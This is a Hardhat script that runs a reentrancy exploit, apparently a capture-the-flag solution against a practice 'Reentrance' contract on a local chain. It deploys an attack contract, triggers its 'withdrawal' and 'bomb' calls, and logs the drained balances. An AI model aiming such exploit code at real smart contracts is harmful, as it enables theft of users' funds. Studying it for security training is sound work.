const { ethers } = require('hardhat');
const { Contract } = require('hardhat/internal/hardhat-network/stack-traces/model');

async function main () {
    const useraddr = "0x70997970C51812dc3A010C7d01b50e0d17dc79C8";
    const instansaddr = "0xDC17C27Ae8bE831AF07CC38C02930007060020F4";
    const signer = await ethers.getSigner(useraddr);
    const contract = await ethers.getContractAt(
        "Reentrance",
        instansaddr,
        signer
    );
    const attack = await ethers.getContractFactory("Attack");
    const a_deploy = await attack.deploy(instansaddr);
    const a_address = a_deploy.target;

    console.log("Attack contract addresss :", a_address);
    console.log("Send 1 ether for attack");

    let bal = await ethers.provider.getBalance(instansaddr);
    bal = ethers.formatEther(bal);
    let eth = ethers.parseEther("1");

    console.log("Before contract balance: ", bal);
    
    bal = await ethers.provider.getBalance(a_address);
    bal = ethers.formatEther(bal);

    console.log("Before attack contract balance: ", bal);

    let tx_1 = await a_deploy.withdrawal({value: eth});
    eth = ethers.parseEther("0.01")
    let tx_2 = await a_deploy.bomb({value: eth});
    console.log("Send exploit (1): ", tx_1.hash);
    console.log("Send exploit (2): ", tx_2.hash);

    bal = await ethers.provider.getBalance(instansaddr);
    bal = ethers.formatEther(bal);

    console.log("After contract balance: ", bal);

    bal = await ethers.provider.getBalance(a_address);
    bal = ethers.formatEther(bal);

    console.log("After attack contract balance: ", bal);

    bal = await contract.balanceOf(useraddr);

    console.log(bal);
}

main().catch((error) => {
    console.log(error);
    process.exit(1);
})
